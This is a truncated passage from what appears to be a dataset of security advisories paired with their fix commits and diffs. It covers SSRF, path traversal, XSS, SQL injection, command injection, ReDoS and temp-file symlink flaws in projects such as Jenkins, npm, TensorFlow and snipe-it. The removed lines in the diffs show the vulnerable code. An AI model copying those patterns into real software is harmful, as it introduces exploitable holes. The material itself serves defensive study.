vin01","published_date":"2022-03-03","chain_len":2,"project":"https:\/\/github.com\/twisted\/twisted","commit_href":"https:\/\/github.com\/twisted\/twisted\/commit\/89c395ee794e85a9657b112c4351417850330ef9","commit_sha":"89c395ee794e85a9657b112c4351417850330ef9","patch":"MULTI","chain_ord":"['98387b39e9f0b21462f6abc7a1325dc370fcdeb1', '89c395ee794e85a9657b112c4351417850330ef9']","before_first_fix_commit":"{'2b2af4d66e878d66572babcbcbd2d3dc7d6a09f2'}","last_fix_commit":"89c395ee794e85a9657b112c4351417850330ef9","chain_ord_pos":2.0,"commit_datetime":"03\/01\/2022, 10:39:34","message":"Update the release date.","author":"Adi Roiban","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'NEWS.rst': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/twisted\/twisted\/raw\/89c395ee794e85a9657b112c4351417850330ef9\/NEWS.rst', 'patch': '@@ -3,8 +3,8 @@ http:\/\/twistedmatrix.com\/trac\/ticket\/<number>\\n \\n .. towncrier release notes start\\n \\n-Twisted 22.2.0.rc1 (2022-02-08)\\n-===============================\\n+Twisted 22.2.0 (2022-03-01)\\n+===========================\\n \\n Bugfixes\\n --------'}}","message_norm":"update the release date.","language":"en","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['NEWS.rst'])","num_files":1.0},{"index":3015,"vuln_id":"GHSA-rv87-vcv4-fjvr","cwe_id":"{'CWE-918'}","score":6.5,"chain":"{'https:\/\/github.com\/jenkinsci\/urltrigger-plugin\/commit\/aec43e370550b26636aa9cab0f23a5cbcffdc44f', 'https:\/\/github.com\/jenkinsci\/urltrigger-plugin\/commit\/46220e69c220bacf8eb23911c8feba9dd68d1a26'}","dataset":"osv","summary":"URLTrigger Plugin server-side request forgery vulnerability A server-side request forgery vulnerability exists in Jenkins URLTrigger Plugin 0.41 and earlier in URLTrigger.java that allows attackers with Overall\/Read access to cause Jenkins to send a GET request to a specified URL. As of version 0.43, this form validation method no longer connects to a user provided URL.","published_date":"2022-05-14","chain_len":2,"project":"https:\/\/github.com\/jenkinsci\/urltrigger-plugin","commit_href":"https:\/\/github.com\/jenkinsci\/urltrigger-plugin\/commit\/aec43e370550b26636aa9cab0f23a5cbcffdc44f","commit_sha":"aec43e370550b26636aa9cab0f23a5cbcffdc44f","patch":"MULTI","chain_ord":"['46220e69c220bacf8eb23911c8feba9dd68d1a26', 'aec43e370550b26636aa9cab0f23a5cbcffdc44f']","before_first_fix_commit":"{'46220e69c220bacf8eb23911c8feba9dd68d1a26'}","last_fix_commit":"aec43e370550b26636aa9cab0f23a5cbcffdc44f","chain_ord_pos":2.0,"commit_datetime":"05\/29\/2018, 21:33:01","message":"Given that the URL is polled, may be valid at poll-time but not at\nconfiguration-time and may contain environment variables that could\nchange the URL at poll-time, validating it during configuration is\npointless.","author":"Tony Noble","comments":null,"stats":"{'additions': 2, 'deletions': 15, 'total': 17}","files":"{'src\/main\/java\/org\/jenkinsci\/plugins\/urltrigger\/URLTrigger.java': {'additions': 2, 'deletions': 15, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/urltrigger-plugin\/raw\/aec43e370550b26636aa9cab0f23a5cbcffdc44f\/src%2Fmain%2Fjava%2Forg%2Fjenkinsci%2Fplugins%2Furltrigger%2FURLTrigger.java', 'patch': '@@ -743,21 +743,8 @@ public FormValidation doCheckURL(@QueryParameter String value) {\\n             if ( value.contains( \"$\" ) ) {\\n             \\treturn FormValidation.warning( \"URL is parameterised and cannot be fully validated\" ) ;\\n             }\\n-\\n-            try {\\n-                URI uri = new URI(value);\\n-                if (uri.getScheme().equals(\"ftp\")) {\\n-                    FTPClient ftpClient = getFTPClientObject(value, null, null);\\n-                    ftpClient.getModificationTime(uri.getPath());\\n-                } else {\\n-                    ClientConfig cc = new DefaultClientConfig();\\n-                    Client client = Client.create(cc);\\n-                    client.resource(value).get(ClientResponse.class);\\n-                }\\n-                return FormValidation.ok();\\n-            } catch (Exception e) {\\n-                return FormValidation.error(e.getMessage());\\n-            }\\n+            \\n+            return FormValidation.ok();\\n         }\\n \\n         public FormValidation doCheckTimeout(@QueryParameter String value) {'}}","message_norm":"given that the url is polled, may be valid at poll-time but not at\nconfiguration-time and may contain environment variables that could\nchange the url at poll-time, validating it during configuration is\npointless.","language":"en","entities":"[('change', 'ACTION', ''), ('validating', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/org\/jenkinsci\/plugins\/urltrigger\/URLTrigger.java'])","num_files":1.0},{"index":3022,"vuln_id":"GHSA-rwv8-jvff-jq28","cwe_id":"{'CWE-22'}","score":0.0,"chain":"{'https:\/\/github.com\/tnantoka\/public\/commit\/eae8ad8017b260f8667ded5e12801bd72b877af2'}","dataset":"osv","summary":"Path Traversal in public Versions of `public` before 0.1.3 are vulnerable to path traversal. This is due to lack of file path sanitization which could lead to any file the parent process has access to on the server to be read by malicious user.\n\n\n## Recommendation\n\nUpdate to version 0.1.3 or later.","published_date":"2018-07-18","chain_len":1,"project":"https:\/\/github.com\/tnantoka\/public","commit_href":"https:\/\/github.com\/tnantoka\/public\/commit\/eae8ad8017b260f8667ded5e12801bd72b877af2","commit_sha":"eae8ad8017b260f8667ded5e12801bd72b877af2","patch":"SINGLE","chain_ord":"['eae8ad8017b260f8667ded5e12801bd72b877af2']","before_first_fix_commit":"{'c5c14107c00eb37c677eabcc5566938a0dee685c'}","last_fix_commit":"eae8ad8017b260f8667ded5e12801bd72b877af2","chain_ord_pos":1.0,"commit_datetime":"02\/15\/2018, 05:13:37","message":"Fix path traversal","author":"tnantoka","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'bin\/public': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tnantoka\/public\/raw\/eae8ad8017b260f8667ded5e12801bd72b877af2\/bin%2Fpublic', 'patch': \"@@ -67,6 +67,7 @@ switch (args[0]) {\\n       }\\n     }\\n }\\n+var root = path.resolve(dir);\\n \\n if (path) {\\n   http.createServer(function(req, res) {\\n@@ -75,6 +76,13 @@ if (path) {\\n     var base = filePath.replace(dir, ''); \/\/ Base path for browser link\\n     var abs = path.resolve(filePath); \\n     console.log(new Date().toString(), abs);\\n+\\n+    if (abs.indexOf(root) !== 0) {\\n+      res.writeHead(403, { 'Content-Type': 'text\/plain' });\\n+      res.end('Forbidden\\\\n');\\n+      return;\\n+    }\\n+\\n     fs.readFile(filePath, function(err, data) {\\n       if (err) {\\n         res.writeHead(200, { 'Content-Type': 'text\/html' });\"}}","message_norm":"fix path traversal","language":"en","entities":"[('fix', 'ACTION', ''), ('path traversal', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bin\/public'])","num_files":1.0},{"index":3023,"vuln_id":"GHSA-rww7-2gpw-fv6j","cwe_id":"{'CWE-754'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cb164786dc891ea11d3a900e90367c339305dc7b'}","dataset":"osv","summary":"Crash when type cannot be specialized in Tensorflow ### Impact\nUnder certain scenarios, TensorFlow can fail to specialize a type during [shape inference](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/shape_inference.cc#L168-L174):\n\n```cc\nvoid InferenceContext::PreInputInit(\n    const OpDef& op_def, const std::vector<const Tensor*>& input_tensors,\n    const std::vector<ShapeHandle>& input_tensors_as_shapes) {\n  const auto ret = full_type::SpecializeType(attrs_, op_def);\n  DCHECK(ret.status().ok()) << \"while instantiating types: \" << ret.status();\n  ret_types_ = ret.ValueOrDie();\n  \/\/ ... \n}\n```\n\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the `ValueOrDie` line. This results in an assertion failure as `ret` contains an error `Status`, not a value. In the second case we also get a crash due to the assertion failure.\n### Patches\nWe have patched the issue in GitHub commit [cb164786dc891ea11d3a900e90367c339305dc7b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cb164786dc891ea11d3a900e90367c339305dc7b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cb164786dc891ea11d3a900e90367c339305dc7b","commit_sha":"cb164786dc891ea11d3a900e90367c339305dc7b","patch":"SINGLE","chain_ord":"['cb164786dc891ea11d3a900e90367c339305dc7b']","before_first_fix_commit":"{'c2b31ff2d3151acb230edc3f5b1832d2c713a9e0'}","last_fix_commit":"cb164786dc891ea11d3a900e90367c339305dc7b","chain_ord_pos":1.0,"commit_datetime":"11\/08\/2021, 18:28:34","message":"Properly handle the case where `SpecializeType()` returns an error `Status`.\n\nIf the error case in `SpecializeType()` is reached, then we would get a crash when trying to access the value of an errorenous `StatusOr` object\n\nPiperOrigin-RevId: 408380069\nChange-Id: If3c3fc876dcf9384d5ec7a4985adc68c23ea7318","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'tensorflow\/core\/framework\/shape_inference.cc': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/cb164786dc891ea11d3a900e90367c339305dc7b\/tensorflow%2Fcore%2Fframework%2Fshape_inference.cc', 'patch': '@@ -170,7 +170,10 @@ void InferenceContext::PreInputInit(\\n     const std::vector<ShapeHandle>& input_tensors_as_shapes) {\\n   \/\/ TODO(mdan): This is also done at graph construction. Run only here instead?\\n   const auto ret = full_type::SpecializeType(attrs_, op_def);\\n-  DCHECK(ret.status().ok()) << \"while instantiating types: \" << ret.status();\\n+  if (!ret.status().ok()) {\\n+    construction_status_ = ret.status();\\n+    return;\\n+  }\\n   ret_types_ = ret.ValueOrDie();\\n \\n   input_tensors_ = input_tensors;'}}","message_norm":"properly handle the case where `specializetype()` returns an error `status`.\n\nif the error case in `specializetype()` is reached, then we would get a crash when trying to access the value of an errorenous `statusor` object\n\npiperorigin-revid: 408380069\nchange-id: if3c3fc876dcf9384d5ec7a4985adc68c23ea7318","language":"en","entities":"[('error', 'FLAW', ''), ('error', 'FLAW', ''), ('408380069', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/shape_inference.cc'])","num_files":1.0},{"index":3024,"vuln_id":"GHSA-rwxp-hwwf-653v","cwe_id":"{'CWE-94', 'CWE-200'}","score":5.4,"chain":"{'https:\/\/github.com\/TryGhost\/express-hbs\/commit\/ff6fad6e357699412d4e916273314e5e7af1500e'}","dataset":"osv","summary":"Insecure template handling in express-hbs express-hbs is an Express handlebars template engine. express-hbs mixes pure template data with engine configuration options through the Express render API. More specifically, the layout parameter may trigger file disclosure vulnerabilities in downstream applications. This potential vulnerability is somewhat restricted in that only files with existing extentions (i.e. file.extension) can be included, files that lack an extension will have .hbs appended to them. For complete details refer to the referenced GHSL-2021-019 report. Notes in documentation have been added to help users of express-hbs avoid this potential information exposure vulnerability.","published_date":"2021-05-17","chain_len":1,"project":"https:\/\/github.com\/TryGhost\/express-hbs","commit_href":"https:\/\/github.com\/TryGhost\/express-hbs\/commit\/ff6fad6e357699412d4e916273314e5e7af1500e","commit_sha":"ff6fad6e357699412d4e916273314e5e7af1500e","patch":"SINGLE","chain_ord":"['ff6fad6e357699412d4e916273314e5e7af1500e']","before_first_fix_commit":"{'070fe175e8eb866230981b09926a1883517aca11'}","last_fix_commit":"ff6fad6e357699412d4e916273314e5e7af1500e","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2021, 12:09:28","message":"\ud83d\udd12 Added notes on a potential security vulnerability\n\n- Express.js never intended for template options to be passed via res.render\n- If you use res.render to pass a layout, the file will be read from disk\n- If you pass user-submitted data as options to res.render e.g. using req.query, then user-submitted file paths will be read\n- This is only a potential security vulnerability, depending on the implementation\n- Further fixes will be pushed to express-hbs to disable this behaviour by default","author":"Hannah Wolfe","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'README.md': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TryGhost\/express-hbs\/raw\/ff6fad6e357699412d4e916273314e5e7af1500e\/README.md', 'patch': \"@@ -99,6 +99,10 @@ There are three ways to use a layout, listed in precedence order\\n \\n 2.  As an option to render\\n \\n+    ## \u26a0\ufe0f This creates a potential security vulnerability:\\n+\\n+    Do not use this option in conjunction with passing user submitted data to res.render e.g. `res.render('index', req.query)`. This allows users to read arbitrary files from your filesystem!\\n+\\n     ```js\\n     res.render('veggies', {\\n       title: 'My favorite veggies',\"}}","message_norm":"\ud83d\udd12 added notes on a potential security vulnerability\n\n- express.js never intended for template options to be passed via res.render\n- if you use res.render to pass a layout, the file will be read from disk\n- if you pass user-submitted data as options to res.render e.g. using req.query, then user-submitted file paths will be read\n- this is only a potential security vulnerability, depending on the implementation\n- further fixes will be pushed to express-hbs to disable this behaviour by default","language":"en","entities":"[('added', 'ACTION', ''), ('security', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('security', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['README.md'])","num_files":1.0},{"index":3027,"vuln_id":"GHSA-rxch-gp62-574w","cwe_id":"{'CWE-79'}","score":6.4,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/9d5d1a9f9aae2c8baee48551185da5de0cdb62c2'}","dataset":"osv","summary":"snipe-it is vulnerable to Cross-site Scripting snipe-it is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').","published_date":"2021-12-16","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/9d5d1a9f9aae2c8baee48551185da5de0cdb62c2","commit_sha":"9d5d1a9f9aae2c8baee48551185da5de0cdb62c2","patch":"SINGLE","chain_ord":"['9d5d1a9f9aae2c8baee48551185da5de0cdb62c2']","before_first_fix_commit":"{'3a7cef15bd7578f93104011137222512d4c95f4e'}","last_fix_commit":"9d5d1a9f9aae2c8baee48551185da5de0cdb62c2","chain_ord_pos":1.0,"commit_datetime":"12\/13\/2021, 20:03:03","message":"Added escape to assigned_to API response\n\nSigned-off-by: snipe <snipe@snipe.net>","author":"snipe","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/Http\/Transformers\/AssetsTransformer.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/9d5d1a9f9aae2c8baee48551185da5de0cdb62c2\/app%2FHttp%2FTransformers%2FAssetsTransformer.php', 'patch': \"@@ -170,7 +170,7 @@ public function transformAssignedTo($asset)\\n         }\\n         return $asset->assigned ? [\\n             'id' => $asset->assigned->id,\\n-            'name' => $asset->assigned->display_name,\\n+            'name' => e($asset->assigned->display_name),\\n             'type' => $asset->assignedType()\\n         ] : null;\\n     }\"}}","message_norm":"added escape to assigned_to api response\n\nsigned-off-by: snipe <snipe@snipe.net>","language":"en","entities":"[('added', 'ACTION', ''), ('escape', 'SECWORD', ''), ('snipe@snipe.net', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Transformers\/AssetsTransformer.php'])","num_files":1.0},{"index":3029,"vuln_id":"GHSA-v222-6mr4-qj29","cwe_id":"{'CWE-78'}","score":10.0,"chain":"{'https:\/\/github.com\/jirutka\/asciidoctor-include-ext\/commit\/cbaccf3de533cbca224bf61d0b74e4b84d41d8ee', 'https:\/\/github.com\/jirutka\/asciidoctor-include-ext\/commit\/c7ea001a597c7033575342c51483dab7b87ae155'}","dataset":"osv","summary":"Command Injection vulnerability in asciidoctor-include-ext ### Impact\n\nApplications using [Asciidoctor (Ruby)](https:\/\/github.com\/asciidoctor\/asciidoctor) with [asciidoctor-include-ext](https:\/\/github.com\/jirutka\/asciidoctor-include-ext) (prior to version 0.4.0), which render user-supplied input in AsciiDoc markup, may allow an attacker to execute arbitrary system commands on the host operating system. ~~This attack is possible even when `allow-uri-read` is disabled!~~ (EDIT: it\u2019s not)\n\n\n### Patches\n\nThe vulnerability has been fixed in commit c7ea001 (and further improved in cbaccf3), which is included in version [0.4.0](https:\/\/rubygems.org\/gems\/asciidoctor-include-ext\/versions\/0.4.0).\n\n### Workarounds\n\n```rb\nrequire 'asciidoctor\/include_ext'\n\nclass Asciidoctor::IncludeExt::IncludeProcessor\n  # Overrides superclass private method to mitigate Command Injection\n  # vulnerability in asciidoctor-include-ext <0.4.0.\n  def target_uri?(target)\n    target.downcase.start_with?('http:\/\/', 'https:\/\/') \\\n      && URI.parse(target).is_a?(URI::HTTP)\n  rescue URI::InvalidURIError\n    false\n  end\nend\n```\n\n### References\n\n* https:\/\/sakurity.com\/blog\/2015\/02\/28\/openuri.html\n\n### Credits\n\nThis vulnerability was discovered by Joern Schneeweisz from the GitLab Security Research Team.\n\n\n### For more information\n\nSee commit message c7ea001.\n\nIf you have any questions or comments about this advisory open an issue in [jirutka\/asciidoctor-include-ext](https:\/\/github.com\/jirutka\/asciidoctor-include-ext\/issues\/).","published_date":"2022-03-31","chain_len":2,"project":"https:\/\/github.com\/jirutka\/asciidoctor-include-ext","commit_href":"https:\/\/github.com\/jirutka\/asciidoctor-include-ext\/commit\/cbaccf3de533cbca224bf61d0b74e4b84d41d8ee","commit_sha":"cbaccf3de533cbca224bf61d0b74e4b84d41d8ee","patch":"MULTI","chain_ord":"['c7ea001a597c7033575342c51483dab7b87ae155', 'cbaccf3de533cbca224bf61d0b74e4b84d41d8ee']","before_first_fix_commit":"{'c7ea001a597c7033575342c51483dab7b87ae155'}","last_fix_commit":"cbaccf3de533cbca224bf61d0b74e4b84d41d8ee","chain_ord_pos":2.0,"commit_datetime":"03\/29\/2022, 22:50:30","message":"Make #read_lines code more robust, avoid using IO.open directly","author":"Jakub Jirutka","comments":null,"stats":"{'additions': 10, 'deletions': 4, 'total': 14}","files":"{'lib\/asciidoctor\/include_ext\/include_processor.rb': {'additions': 10, 'deletions': 4, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jirutka\/asciidoctor-include-ext\/raw\/cbaccf3de533cbca224bf61d0b74e4b84d41d8ee\/lib%2Fasciidoctor%2Finclude_ext%2Finclude_processor.rb', 'patch': \"@@ -113,10 +113,16 @@ def resolve_target_path(target, reader)\\n     #   the line number. If `nil` is given, all lines are passed.\\n     # @return [Array<String>] an array of read lines.\\n     def read_lines(path, selector)\\n-      if selector\\n-        IO.foreach(path).select.with_index(1, &selector)\\n-      else\\n-        URI.open(path, &:read)\\n+      # IO.open is deliberately not used directly to avoid potential security risks.\\n+      # TODO: Get rid of 'open-uri' (URI.open).\\n+      io = target_http?(path) ? URI : File\\n+\\n+      io.open(path) do |f|\\n+        if selector\\n+          f.each.select.with_index(1, &selector)\\n+        else\\n+          f.read\\n+        end\\n       end\\n     end\"}}","message_norm":"make #read_lines code more robust, avoid using io.open directly","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/asciidoctor\/include_ext\/include_processor.rb'])","num_files":1.0},{"index":3034,"vuln_id":"GHSA-v2p6-4mp7-3r9v","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/epeli\/underscore.string\/commit\/f486cd684c94c12db48b45d52b1472a1b9661029'}","dataset":"osv","summary":"Regular Expression Denial of Service in underscore.string Versions of `underscore.string` prior to *3.3.5* are vulnerable to Regular Expression Denial of Service (ReDoS).\n\nThe function `unescapeHTML` is vulnerable to ReDoS due to an overly-broad regex. The slowdown is approximately 2s for 50,000 characters but grows exponentially with larger inputs.\n\n\n## Recommendation\n\nUpgrade to version 3.3.5 or higher.","published_date":"2019-06-14","chain_len":1,"project":"https:\/\/github.com\/epeli\/underscore.string","commit_href":"https:\/\/github.com\/epeli\/underscore.string\/commit\/f486cd684c94c12db48b45d52b1472a1b9661029","commit_sha":"f486cd684c94c12db48b45d52b1472a1b9661029","patch":"SINGLE","chain_ord":"['f486cd684c94c12db48b45d52b1472a1b9661029']","before_first_fix_commit":"{'2f78f0d6e36d553484a1bf5fe5ed1998f013dea5'}","last_fix_commit":"f486cd684c94c12db48b45d52b1472a1b9661029","chain_ord_pos":1.0,"commit_datetime":"10\/03\/2018, 21:34:42","message":"Try to fix regexp redos\n\nfixes  #510","author":"Esa-Matti Suuronen","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'unescapeHTML.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/esamattis\/underscore.string\/raw\/f486cd684c94c12db48b45d52b1472a1b9661029\/unescapeHTML.js', 'patch': \"@@ -2,7 +2,7 @@ var makeString = require('.\/helper\/makeString');\\n var htmlEntities = require('.\/helper\/htmlEntities');\\n \\n module.exports = function unescapeHTML(str) {\\n-  return makeString(str).replace(\/\\\\&([^;]+);\/g, function(entity, entityCode) {\\n+  return makeString(str).replace(\/\\\\&([^;]{1,10});\/g, function(entity, entityCode) {\\n     var match;\\n \\n     if (entityCode in htmlEntities) {\"}}","message_norm":"try to fix regexp redos\n\nfixes  #510","language":"en","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#510', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['unescapeHTML.js'])","num_files":1.0},{"index":3040,"vuln_id":"GHSA-v3jv-wrf4-5845","cwe_id":"{'CWE-59'}","score":0.0,"chain":"{'https:\/\/github.com\/npm\/npm\/commit\/f4d31693e73a963574a88000580db1a716fe66f1'}","dataset":"osv","summary":"Local Privilege Escalation in npm Affected versions of `npm` use predictable temporary file names during archive unpacking. If an attacker can create a symbolic link at the location of one of these temporary file names, the attacker can arbitrarily write to any file that the user which owns the `npm` process has permission to write to, potentially resulting in local privilege escalation.\n\n\n\n## Recommendation\n\nUpdate to version 1.3.3 or later.","published_date":"2020-09-01","chain_len":1,"project":"https:\/\/github.com\/npm\/npm","commit_href":"https:\/\/github.com\/npm\/npm\/commit\/f4d31693e73a963574a88000580db1a716fe66f1","commit_sha":"f4d31693e73a963574a88000580db1a716fe66f1","patch":"SINGLE","chain_ord":"['f4d31693e73a963574a88000580db1a716fe66f1']","before_first_fix_commit":"{'e3007309aa93e94b69b5094fa1b11070b2ef993c'}","last_fix_commit":"f4d31693e73a963574a88000580db1a716fe66f1","chain_ord_pos":1.0,"commit_datetime":"07\/10\/2013, 15:59:28","message":"Put 6 bytes of random in tmp folder name\n\nCloses #3635","author":"isaacs","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'lib\/npm.js': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/npm\/npm\/raw\/f4d31693e73a963574a88000580db1a716fe66f1\/lib%2Fnpm.js', 'patch': '@@ -477,9 +477,14 @@ Object.defineProperty(npm, \"cache\",\\n   })\\n \\n var tmpFolder\\n+var crypto = require(\"crypto\")\\n+var rand = crypto.randomBytes(6)\\n+                 .toString(\"base64\")\\n+                 .replace(\/\\\\\/\/g, \\'_\\')\\n+                 .replace(\/\\\\+\/, \\'-\\')\\n Object.defineProperty(npm, \"tmp\",\\n   { get : function () {\\n-      if (!tmpFolder) tmpFolder = \"npm-\" + process.pid\\n+      if (!tmpFolder) tmpFolder = \"npm-\" + process.pid + \"-\" + rand\\n       return path.resolve(npm.config.get(\"tmp\"), tmpFolder)\\n     }\\n   , enumerable : true'}}","message_norm":"put 6 bytes of random in tmp folder name\n\ncloses #3635","language":"en","entities":"[('#3635', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/npm.js'])","num_files":1.0},{"index":3041,"vuln_id":"GHSA-v3mr-gp7j-pw5w","cwe_id":"{'CWE-89'}","score":0.0,"chain":"{'https:\/\/github.com\/terminal42\/contao-tablelookupwizard\/commit\/a5e723a28f110b7df8ffc4175cef9b061d3cc717'}","dataset":"osv","summary":"Possible SQL injection in tablelookupwizard Contao Extension ### Impact\nThe currently selected widget values were not correctly sanitized before passing it to the database, leading to an SQL injection possibility.\n\n### Patches\nThe issue has been patched in `tablelookupwizard` version 3.3.5 and version 4.0.0.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https:\/\/github.com\/terminal42\/contao-tablelookupwizard\n* Email us at [info@terminal42.ch](mailto:info@terminal42.ch)","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/terminal42\/contao-tablelookupwizard","commit_href":"https:\/\/github.com\/terminal42\/contao-tablelookupwizard\/commit\/a5e723a28f110b7df8ffc4175cef9b061d3cc717","commit_sha":"a5e723a28f110b7df8ffc4175cef9b061d3cc717","patch":"SINGLE","chain_ord":"['a5e723a28f110b7df8ffc4175cef9b061d3cc717']","before_first_fix_commit":"{'ae6c82f10b0f1e87226079ebaa78ac630b05279a'}","last_fix_commit":"a5e723a28f110b7df8ffc4175cef9b061d3cc717","chain_ord_pos":1.0,"commit_datetime":"02\/04\/2022, 07:13:15","message":"Fixed SQL query for current field value","author":"Andreas Schempp","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'TableLookupWizard.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/terminal42\/contao-tablelookupwizard\/raw\/a5e723a28f110b7df8ffc4175cef9b061d3cc717\/TableLookupWizard.php', 'patch': '@@ -407,9 +407,9 @@ protected function prepareWhere()\\n \\n         \/\/ Filter those that have already been chosen\\n         if (\\'checkbox\\' === $this->fieldType && \\\\is_array($varData) && !empty($varData)) {\\n-            $this->arrWhereProcedure[] = $this->foreignTable.\\'.id NOT IN (\\'.implode(\\',\\', $varData).\\')\\';\\n+            $this->arrWhereProcedure[] = $this->foreignTable.\\'.id NOT IN (\\'.implode(\\',\\', array_map(\\'intval\\', $varData)).\\')\\';\\n         } elseif (\\'radio\\' === $this->fieldType && \\'\\' !== $varData) {\\n-            $this->arrWhereProcedure[] = \"{$this->foreignTable}.id!=\\'$varData\\'\";\\n+            $this->arrWhereProcedure[] = $this->foreignTable.\\'.id!=\\'.(int) $varData;\\n         }\\n \\n         \/\/ If custom WHERE is set, add it to the statement'}}","message_norm":"fixed sql query for current field value","language":"ca","entities":"[('fixed', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['TableLookupWizard.php'])","num_files":1.0},{"index":3050,"vuln_id":"GHSA-v52p-hfjf-wg88","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6d36ba65577006affb272335b7c1abd829010708'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `SpaceToBatchNd` ### Impact\nThe implementation of the `SpaceToBatchNd` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/412c7d9bb8f8a762c5b266c9e73bfa165f29aac8\/tensorflow\/lite\/kernels\/space_to_batch_nd.cc#L82-L83):\n\n```cc\nTF_LITE_ENSURE_EQ(context, final_dim_size % block_shape[dim], 0);\noutput_size->data[dim + 1] = final_dim_size \/ block_shape[dim];\n```\n\nAn attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [6d36ba65577006affb272335b7c1abd829010708](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6d36ba65577006affb272335b7c1abd829010708).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6d36ba65577006affb272335b7c1abd829010708","commit_sha":"6d36ba65577006affb272335b7c1abd829010708","patch":"SINGLE","chain_ord":"['6d36ba65577006affb272335b7c1abd829010708']","before_first_fix_commit":"{'412c7d9bb8f8a762c5b266c9e73bfa165f29aac8'}","last_fix_commit":"6d36ba65577006affb272335b7c1abd829010708","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 21:22:30","message":"Prevent division by 0\n\nPiperOrigin-RevId: 370984990\nChange-Id: Ib324955bbeb1cbd97c82fd5d61a00a2697c9a2de","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/space_to_batch_nd.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 